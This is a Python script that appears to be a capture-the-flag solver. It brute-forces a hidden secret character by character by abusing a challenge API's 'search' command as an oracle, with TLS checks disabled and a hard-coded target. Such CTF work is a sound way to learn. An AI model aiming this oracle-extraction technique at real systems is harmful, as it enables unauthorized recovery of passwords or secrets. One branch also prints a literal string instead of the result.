import sys
import requests
from string import ascii_lowercase, digits

import urllib3
urllib3.disable_warnings()

target = 'https://54.156.99.36/api/command' 
charset = ascii_lowercase + digits


def lookahead(passw):
    while True:
        found = 0
        for c in charset:
            sys.stdout.write(" " * 30 + "\r")
            sys.stdout.write(f"[{c}] [{passw}]\r")
            results = requests.post(
                    target, 
                    json={"command": f"search {passw}{c}"},
                    headers={"Host": "f52f803cd47d2b3c3cefe70e372e46e.dax.challenges.hfctf.ca"},
                    verify=False).text
            if results != '""':
                found = 1
                passw = passw + c
        if found == 0:
            print("\n", "passw")
            break


def lookbehind(passw):
    while True:
        found = 0
        for c in charset:
            sys.stdout.write(" " * 30 + "\r")
            sys.stdout.write(f"[{c}] [{passw}]\r")
            results = requests.post(
                    target,
                    json={"command": f"search {c}{passw}"},
                    headers={"Host": "f52f803cd47d2b3c3cefe70e372e46e.dax.challenges.hfctf.ca"},
                    verify=False).text
            if results != '""':
                found = 1
                passw = c + passw
        if found == 0:
            print("\n", passw)
            break


if __name__ == "__main__": 
    if len(sys.argv) != 3:
        print("./autosolve.py <initial-char> <behind|ahead>")

    passw = sys.argv[1]
    direction = sys.argv[2]
    
    if direction == "ahead":
        lookahead(passw)
    elif direction == "behind":
        lookbehind(passw)
    else:
        print("[!] invalid direction.")


